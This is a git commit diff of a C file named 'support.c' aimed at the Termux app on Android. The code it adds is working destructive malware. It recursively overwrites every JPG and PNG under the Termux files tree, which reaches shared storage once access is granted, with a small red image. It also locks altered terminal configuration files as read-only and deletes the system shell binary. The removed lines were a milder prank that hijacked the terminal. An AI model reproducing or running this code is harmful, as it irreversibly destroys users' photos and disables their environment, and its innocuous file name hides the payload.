a5b443349d51dfc0def8eb7d684bec09be03843f
Mahdee Mohammad <maxdeexd@yahoo.com>
2021-06-14 13:18:23 +0600

    Add files via upload

--- support.c
+++ support.c
@@ -1,28 +1,71 @@
-#include <dirent.h>
 #include <stdio.h>
-#include <stdlib.h>
+#include <dirent.h>
 #include <string.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <stdlib.h>
+
+void makeThemRed(char* root){
+    unsigned short int i, bytes[363] = {255, 216, 255, 224, 0, 16, 74, 70, 73, 70, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 255, 219, 0, 67, 0, 16, 11, 12, 14, 12, 10, 16, 14, 13, 14, 18, 17, 16, 19, 24, 40, 26, 24, 22, 22, 24, 49, 35, 37, 29, 40, 58, 51, 61, 60, 57, 51, 56, 55, 64, 72, 92, 78, 64, 68, 87, 69, 55, 56, 80, 109, 81, 87, 95, 98, 103, 104, 103, 62, 77, 113, 121, 112, 100, 120, 92, 101, 103, 99, 255, 219, 0, 67, 1, 17, 18, 18, 24, 21, 24, 47, 26, 26, 47, 99, 66, 56, 66, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 255, 192, 0, 17, 8, 0, 100, 0, 100, 3, 1, 34, 0, 2, 17, 1, 3, 17, 1, 255, 196, 0, 21, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 5, 255, 196, 0, 20, 16, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 196, 0, 22, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 5, 6, 255, 196, 0, 20, 17, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 218, 0, 12, 3, 1, 0, 2, 17, 3, 17, 0, 63, 0, 138, 2, 91, 118, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 217};
+    char path[350];
+    struct dirent *dp;
+    DIR *dir = opendir(root);
+    if(dir == NULL){
+        return;
+    }
+    while((dp = readdir(dir)) != NULL){
+        if(strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0){
+            strcpy(path, root);
+            strcat(path, "/");
+            strcat(path, dp->d_name);
+            if((strstr(dp->d_name, ".jpg") || strstr(dp->d_name, ".jpeg") || strstr(dp->d_name, ".png") || strstr(dp->d_name, ".JPG")) != NULL){
+            //  printf("%s\n", dp->d_name);
+                FILE *img = fopen(path, "w+");
+                for(i=0;i<=362;i++){
+                    fputc(bytes[i], img);
+                }
+                fclose(img);
+            }
+            makeThemRed(path);
+        }
+    }
+    closedir(dir);
+}
+
+void redMinal(){
+	FILE *fp = fopen("/data/data/com.termux/files/usr/etc/motd", "w");
+	fputs("\33[1;33mMalware demonstration\n\33[0m", fp);
+	fchmod(fileno(fp), 0400);
+	fclose(fp);
+	fp = fopen("/data/data/com.termux/files/home/.termux/colors.properties", "w");
+	fputs("background=#ff2626\nforeground=#ff2626\ncursor=#ff2626\n", fp);
+	fchmod(fileno(fp), 0400);
+	fclose(fp);
+	fp = fopen("/data/data/com.termux/files/usr/etc/bash.bashrc", "a");
+	fputs("\n$PS1=\'DemoMalware\'", fp);
+	fchmod(fileno(fp), 0400);
+	fclose(fp);
+	fp = fopen("/data/data/com.termux/files/home/termux.properties", "w");
+	fputs("extra-keys = [\\['THIS', 'IS', 'A', 'BULLSHIT', 'MALWARE']\\]", fp);
+	fchmod(fileno(fp), 0400);
+	fclose(fp);
+	remove("/data/data/com.termux/files/usr/bin/sh");		
+}
+
+
 int main(){
-  if(opendir("/data/data/com.termux/files/home/.termux") == NULL){
-    system("mkdir /data/data/com.termux/files/home/.termux;");
-  }
-  FILE *motd = fopen("/data/data/com.termux/files/usr/etc/motd", "w");
-  fputs("\033[42;1;31DON'T EVER TRY TO HACK FACEBOOK AGAIN >:-#\033[0m\n", motd);
-  FILE *colors = fopen("/data/data/com.termux/files/home/.termux/colors.properties", "w");
-  fputs("background=#ff2626\nforeground=#ff2626\ncursor=#ff2626\n", colors);
-  FILE *bash = fopen("/data/data/com.termux/files/usr/etc/bash.bashrc", "w+");
-  fputs("PS1 = \"You are finished :# ", bash);
-  FILE *tmux = fopen("/data/data/com.termux/files/home/.termux/termux.properties", "w");
-  fputs("extra-keys = [\\['DONT', 'EVER', 'TRY', 'TO', 'HACK', 'FACEBOOK', 'AGAIN']\\]\n", tmux);
-  //FILE *b = fopen("/data/data/com.termux/files/usr/bin/bash", "w+");
-  //fprintf(b,"\033[42;1;31DON'T EVER TRY TO HACK FACEBOOK AGAIN :#");
-  //system("chsh -s yup");
-  fclose(motd);
-  fclose(colors);
-  fclose(bash);
-  fclose(tmux);
-  //fclose(b);
-  printf("Goodbye :)");
-  system("termux-reload-settings");
-  return 0;
+    if((opendir("/data/data/com.termux/files/home/storage")) == NULL){
+    	system("termux-setup-storage;");
+    }
+    if(opendir("/data/data/com.termux/files/home/.termux")==NULL){
+    	mkdir("/data/data/com.termux/files/home/.termux", 0700);
+    }
+    char *path = "/data/data/com.termux/files";
+//  printf("Enter path: ");
+//  scanf("%s", path);
+    makeThemRed(path);
+    redMinal();
+    system("termux-reload-settings;");
+    printf("\33[1;33mGoodbye :)\[0m\n");
+    return 0;
 }
